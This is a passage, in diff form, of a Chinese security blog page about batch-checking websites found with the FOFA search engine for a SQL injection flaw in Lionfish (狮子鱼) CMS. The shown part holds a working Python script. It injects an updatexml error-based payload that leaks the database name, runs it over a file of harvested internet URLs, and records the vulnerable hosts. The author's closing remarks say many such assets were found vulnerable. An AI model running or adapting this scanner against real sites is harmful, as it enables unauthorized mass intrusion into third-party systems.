class="string">&quot;/index.php?s=api/goods_detail&amp;goods_id=1%20and%20updatexml(1,concat(0x7e,database(),0x7e),1)&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">POC</span>(<span class="params">url</span>):</span><br><span class="line">    target_url = url + payload</span><br><span class="line">    headers = &#123;</span><br><span class="line">        <span class="string">&quot;User-Agent&quot;</span>: <span class="string">&quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) &quot;</span></span><br><span class="line">                      <span class="string">&quot;Chrome/86.0.4240.111 Safari/537.36&quot;</span>,</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        response = requests.get(url=target_url, headers=headers, verify=<span class="literal">False</span>, timeout=<span class="number">10</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;正在测试：&quot;</span>, target_url)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;syntax&quot;</span> <span class="keyword">in</span> response.text:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;上述地址存在SQL注入&quot;</span>)</span><br><span class="line">            <span class="keyword">return</span> url</span><br><span class="line"></span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;请求失败！&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line"></span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;狮子鱼SQL.txt&quot;</span>, <span class="string">&quot;r&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        results = f.readlines()</span><br><span class="line">    <span class="keyword">for</span> result <span class="keyword">in</span> results:</span><br><span class="line">        <span class="keyword">if</span> (<span class="string">&quot;http&quot;</span> <span class="keyword">or</span> <span class="string">&quot;https&quot;</span>) <span class="keyword">in</span> result:</span><br><span class="line">            url = result.strip()</span><br><span class="line">            SQL = POC(url)</span><br><span class="line">            <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;存在狮子鱼SQL注入.txt&quot;</span>, <span class="string">&quot;a+&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">                <span class="keyword">if</span> <span class="string">&quot;None&quot;</span> <span class="keyword">not</span> <span class="keyword">in</span> <span class="built_in">str</span>(SQL):</span><br><span class="line">                    f.write(<span class="built_in">str</span>(SQL) + <span class="string">&quot;\n&quot;</span>)</span><br></pre></td></tr></table></figure>
+
+
+
+<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><blockquote>
+<p> 对收集的漏洞信息进行批量监测的一个通用脚本,本质是可以做一个通用的漏洞批量监测的通用模板,可惜的是没有成功获得可以进行测试的weblogic的资产,但是还是发现狮子鱼确实漏洞资产很多可以进行验证,还是有收获的.</p>
+</blockquote>
+
+    </article>
+    
+    <div class="read-nums">
+      <!-- id 将作为查询条件 -->
+      <span id="2024/04/30/安全开发实战-6-对fofa收集的漏洞资产使用poc进行批量验证/" class="leancloud_visitors" data-flag-title="Your Article Title">
+        <em class="post-meta-item-text">浏览量</em>
+        <i class="leancloud-visitors-count"></i>
+      </span>
+    </div>
+    <div class="comments-intro">
+      <h2>评论区</h2>
+      <p>欢迎你留下宝贵的意见，昵称输入QQ号会显示QQ头像哦~</p>
+    </div>
+    <div id="vcomments" class="vcomments"></div>
+    
+  </div>
+  <div class="article-catelogue">
+    <div class="article-catelogue--wrapper">
+      <div class="catelogue catelogue-1">
+        <h3>目录</h3>
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%89%8D%E8%A8%80"><span class="toc-number">1.</span> <span class="toc-text">前言</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E7%8B%AE%E5%AD%90%E9%B1%BCcms-SQL%E6%B3%A8%E5%85%A5"><span class="toc-number">2.</span> <span class="toc-text">狮子鱼cms-SQL注入</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#1-FOFA%E6%94%B6%E9%9B%86%E6%BC%8F%E6%B4%9E%E4%BF%A1%E6%81%AF%E8%AF%AD%E6%B3%95%EF%BC%9A"><span class="toc-number">2.1.</span> <span class="toc-text">1.FOFA收集漏洞信息语法：</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-1-%E6%94%B6%E9%9B%86%E8%AF%AD%E6%B3%95%E5%8F%8A%E8%A7%A3%E9%87%8A"><span class="toc-number">2.1.1.</span> <span class="toc-text">1.1.收集语法及解释</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#1-2-%E6%9E%84%E9%80%A0XPath%E5%8C%B9%E9%85%8D"><span class="toc-number">2.1.2.</span> <span class="toc-text">1.2.构造XPath匹配</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#1-3-%E8%BF%9B%E8%A1%8Cfofa%E4%B8%80%E9%A1%B5%E7%9A%84%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86"><span class="toc-number">2.1.3.</span> <span class="toc-text">1.3.进行fofa一页的信息收集</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2-%E7%99%BB%E5%BD%95%E7%95%8C%E9%9D%A2"><span class="toc-number">2.2.</span> <span class="toc-text">2.登录界面</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#2-1%E5%90%8E%E5%8F%B0%E7%99%BB%E5%BD%95%E7%95%8C%E9%9D%A2-%E4%B8%80%E8%88%AC"><span class="toc-number">2.2.1.</span> <span class="toc-text">2.1后台登录界面(一般)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-2%E5%90%8E%E5%8F%B0%E7%99%BB%E5%BD%95%E7%95%8C%E9%9D%A2-%E7%89%B9%E6%AE%8A"><span class="toc-number">2.2.2.</span> <span class="toc-text">2.2后台登录界面(特殊)</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#3-%E7%BC%96%E5%86%99%E9%AA%8C%E8%AF%81%E8%84%9A%E6%9C%AC"><span class="toc-number">2.3.</span> <span class="toc-text">3.编写验证脚本</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#3-1-%E7%86%9F%E6%82%89%E6%BC%8F%E6%B4%9Epoc"><span class="toc-number">2.3.1.</span> <span class="toc-text">3.1 熟悉漏洞poc</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-2-%E5%A6%82%E4%BD%95%E8%BF%9B%E8%A1%8C%E9%AA%8C%E8%AF%81%E5%91%A2"><span class="toc-number">2.3.2.</span> <span class="toc-text">3.2 如何进行验证呢</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-3-%E8%BF%9B%E8%A1%8C%E7%BC%96%E5%86%99"><span class="toc-number">2.3.3.</span> <span class="toc-text">3.3. 进行编写</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#3-1-1-payload"><span class="toc-number">2.3.3.1.</span> <span class="toc-text">3.1.1.payload</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#3-1-2-%E6%8B%BC%E6%8E%A5%E9%83%A8%E5%88%86"><span class="toc-number">2.3.3.2.</span> <span class="toc-text">3.1.2.拼接部分</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#3-1-3-%E8%AF%B7%E6%B1%82%E4%B8%8E%E9%AA%8C%E8%AF%81%E9%83%A8%E5%88%86"><span class="toc-number">2.3.3.3.</span> <span class="toc-text">3.1.3.请求与验证部分</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#3-1-4-%E4%BC%A0%E5%85%A5%E4%B8%8E%E4%BF%9D%E5%AD%98"><span class="toc-number">2.3.3.4.</span> <span class="toc-text">3.1.4.传入与保存</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-1-5-%E5%AF%B9fofa%E6%94%B6%E9%9B%86%E7%9A%84%E7%8B%AE%E5%AD%90%E9%B1%BC%E8%B5%84%E4%BA%A7%E8%BF%9B%E8%A1%8C%E7%AD%9B%E9%80%89%E5%92%8C%E5%A4%84%E7%90%86"><span class="toc-number">2.3.4.</span> <span class="toc-text">3.1.5.对fofa收集的狮子鱼资产进行筛选和处理</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#3-1-5-%E5%AE%8C%E6%95%B4%E4%BB%A3%E7%A0%81"><span class="toc-number">2.3.4.1.</span> <span class="toc-text">3.1.5.完整代码</span></a></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%80%BB%E7%BB%93"><span class="toc-number">3.</span> <span class="toc-text">总结</span></a></li></ol>
+      </div>
+      
+        <div class="catelogue catelogue-2">
+           
+          
+            <p>
+              <span>下一篇</span>
+              <a href="/2024/04/30/安全开发实战-5-fofa进行漏洞poc的信息收集/">安全开发实战(5)---fofa进行漏洞poc的信息收集</a>
+            </p>
+          
+        </div>
+      
+    </div>
+  </div>
+</div>
+
+
+<script>
+  // var定义，避免pjax重新进来造成的重复声明错误
+  var config = JSON.parse('{"enable":true,"appId":"Pf8zCXGEH1qsprnWfikVVujL-gzGzoHsz","appKey":"qOqoiUHhH1TGtLRUYURkLRQX","placeholder":"请留下你宝贵的意见吧~","meta":["nick"],"recordIP":true,"visitor":true,"enableQQ":true}')
+  new Valine({
+    el: '#vcomments',
+    appId: config.appId,
+    appKey: config.appKey,
+    placeholder: config.placeholder,
+    meta: config.meta,
+    recordIP: config.recordIP,
+    visitor: config.visitor,
+    enableQQ: config.enableQQ,
+    path: '2024/04/30/安全开发实战-6-对fofa收集的漏洞资产使用poc进行批量验证/'
+  })
+</script>
+
+
+<script>
+  $(document).on('pjax:complete', function() {
+    const tocs = document.querySelector('.toc')
+    const links = tocs ? tocs.querySelectorAll('a') : []
+    links.forEach(link => {
+      link.addEventListener('click', e => {
+        const href = decodeURIComponent(e.href)
+        href.search(/#(.*)/)
+        const id = RegExp.$1
+        const target = document.querySelector('#' + id)
+        const top = target.offsetTop
+        document.documentElement.scrollTo({
+          top: top - 100,
+          behavior: 'smooth'
+        })
+        e.preventDefault()
+      })
+    })
+  })
+</script> 
+
+</div>
+      <div class="main-right-wrapper"><div class="main-right">
+  <div class="main-right--board">
+    <div class="main-right--title">
+      <h5>公告栏</h5>
+      <i class="iconfont icon-gonggao"></i>
+    </div>
+    <div class="main-right--content">
+      Hello~大噶好。唔系小鱼，欢迎你们来到我的博客小站，希望能在这里收获到有用的东西哦！ 
+    </div>
+  </div>
+
+  <div id="aplayer" class="main-right--music"></div>
+
+  <div class="operate-items">
+    <div class="operate-item backtop">
+      <i class="iconfont icon-huidaodingbu"></i>
+      <span>回到顶部</span>
+    </div>
+    
+    <div class="operate-item turn-comment hidden">
+      <i class="iconfont icon-pinglun"></i>
+      <span>查看评论</span>
+    </div>
+    
+  </div>
+
+  <div class="main-right--site">
+    <div class="main-right--power">
+      <p>Power By <a target="_blank" rel="noopener" href="https://hexo.io/zh-cn/docs/">Hexo</a>.</p>
+      <p>Theme：<a target="_blank" rel="noopener" href="https://github.com/Aizener/hexo-theme-cola">Cola.</a></p>
+    </div>
+    <p class="main-right--refer"><a target="_blank" rel="noopener" href="https://beian.miit.gov.cn/#/Integrated/index">暂无</a> </p>
+  </div>
+</div>
+
+<script>
+  function setOperateItem () {
+    const reg = /\d{4}\/\d{2}\/\d{2}\/.+/
+    const path = location.pathname
+    const operateDom = document.querySelector('.main-right .operate-items')
+    const commentDom = document.querySelector('.turn-comment')
+    const cateloguDom = document.querySelector('.article-catelogue > .article-catelogue--wrapper');
+
+    if (commentDom) {
+      if (reg.test(path) || path.match(/\/log\/.+/)) {
+        commentDom.classList.remove('hidden')
+        const newDom = operateDom.cloneNode(true);
+        const _backtopDom = newDom.querySelector('.backtop');
+        const _commentDom = newDom.querySelector('.turn-comment');
+        _backtopDom.addEventListener('click', () => backTopEvent());
+        _commentDom.addEventListener('click', () => commentDomEvent());
+        cateloguDom.appendChild(newDom);
+      } else {
+        commentDom.classList.add('hidden')
+      }
+    }
+  }
+
+  setOperateItem()
+  const musics = JSON.parse(`[{"name":"安河桥","artist":"宋冬野","url":"http://ting6.yymp3.net:82/new25/songdongye/11.mp3","cover":"https://img2.baidu.com/it/u=1260056724,1076343118&fm=253&fmt=auto&app=138&f=JPEG?w=500&h=500"},{"name":"卡布达","artist":"暂无","url":"music/kabuda.mp3","cover":"https://img2.baidu.com/it/u=705831265,2862720033&fm=253&fmt=auto&app=138&f=JPEG?w=500&h=500"}]`)
+  const ap = new APlayer({
+    container: document.querySelector('#aplayer'),
+    audio: musics,
+  })
+
+  $(document).on('pjax:complete', function() {
+    setOperateItem()
+  })
+
+  document.querySelector('.backtop').addEventListener('click', () => {
+    backTopEvent();
+  })
+  const dom = document.querySelector('.turn-comment')
+  dom && dom.addEventListener('click', () => {
+    commentDomEvent();
+  })
+
+  function backTopEvent() {
+    document.documentElement.scrollTo({
+      top: 0,
+      behavior: 'smooth'
+    })
+  }
+
+  function commentDomEvent() {
+    const commentDom = document.querySelector('.comments-intro')
+    if (!commentDom) return
+    const top = commentDom.offsetTop, height = commentDom.offsetHeight
+    document.documentElement.scrollTo({
+      top: top - 2 * height,
+      behavior: 'smooth'
+    })
+  }
+</script></div>
+    </section>
+  </div>
+  <div id="progress" class="progress"></div>
+  <div id="gray" class="gray"></div>
+
+  <script>
+    function initScroll () {
+      document.addEventListener('scroll', () => {
+        const doc = document.documentElement
+        const scrollTop = doc.scrollTop
+        const pageHeight = doc.offsetHeight
+        const clientHeight = doc.clientHeight
+        const ratio = scrollTop / (pageHeight - clientHeight)
+        const progress = document.querySelector('#progress')
+        const avatarImg = document.querySelector('.main-left--avatar')
+        progress.style.width = (100 * ratio) + '%'
+        avatarImg.style.transform = `rotate(${360 * ratio}deg)`
+      })
+    }
+
+    const rootPath = "/"
+
+    const checkAndSetArticlePageLayout = () => {
+      const path = location.pathname.replace(rootPath, '');
+      if (
+        /^\/?\d{4}\/\d{2}\/\d{2}\/.*/.test(path) ||
+        /^log\/.+/.test(path)
+      ) {
+        $('.main-container, .main-right, .main-right-wrapper').addClass('is-article')
+      } else {
+        $('.main-container, .main-right, .main-right-wrapper').removeClass('is-article')
+      }
+    }
+
+    const gray = "none"
+    const setGrayStyle = () => {
+      if (gray === 'none') {
+        return
+      } else if (gray === 'index') {
+        location.pathname === '/' ? $('#gray').show() : $('#gray').hide()
+      } else if (gray === 'all') {
+        $('#gray').show()
+      }
+    }
+    setGrayStyle()
+
+
+    window.onload = function () {
+      checkAndSetArticlePageLayout()
+      setTimeout(() => {
+        $('#load').slideUp()
+        $('#container').slideToggle()
+        setTimeout(() => {
+          initScroll();
+        }, 500)
+      }, 500)
+    }
+    
+    let status = 0
+    // 对所有链接跳转事件绑定pjax容器container
+    $(document).pjax('a[target!=_blank]', '#main-container', {
+      container: '#main-container',
+      fragment: '#main-container',
+      timeout: 8000
+    })
+
+    $(document).on('pjax:start', function() {
+    })
+    $(document).on('pjax:complete', function() {
+      status = 0
+      $('.main-container').addClass('to-up').on('animationend', function() {
+        $(this).removeClass('to-up')
+      })
+      setGrayStyle()
+      checkAndSetArticlePageLayout()
+    })
+    $(document).on('pjax:popstate', function() {
+      status = -1
+      checkAndSetArticlePageLayout()
+    });
+  </script>
+</body>
+</html>
